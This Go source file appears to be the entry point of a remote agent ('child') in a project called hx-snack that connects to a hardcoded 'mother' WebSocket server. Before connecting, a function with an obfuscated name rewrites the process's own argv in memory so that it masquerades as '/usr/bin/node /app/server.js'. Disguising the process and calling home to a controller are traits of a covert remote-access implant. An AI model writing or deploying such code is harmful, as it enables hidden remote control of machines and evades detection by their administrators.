package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"reflect"
	"unsafe"

	"github.com/huanxherta/hx-snack/internal/child"
)

// ====== 硬编码配置（编译时修改这里） ======
const (
	motherURL = "ws://<YOUR_HOST>:10300/api/stream"
	motherKey = "<YOUR_KEY>"
)
// ========================================

func xxxxxxxxProcess() {
	name := "/usr/bin/node /app/server.js"
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	buf := (*[1 << 20]byte)(unsafe.Pointer(hdr.Data))[:hdr.Len]
	copy(buf, name)
	for i := len(name); i < len(buf); i++ {
		buf[i] = 0
	}
	hdr.Len = len(name)
}

func main() {
	xxxxxxxxProcess()

	agent := child.NewAgent(motherURL, motherKey, "dev")

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	if err := agent.Run(ctx); err != nil {
		log.Printf("exit: %v", err)
	}
}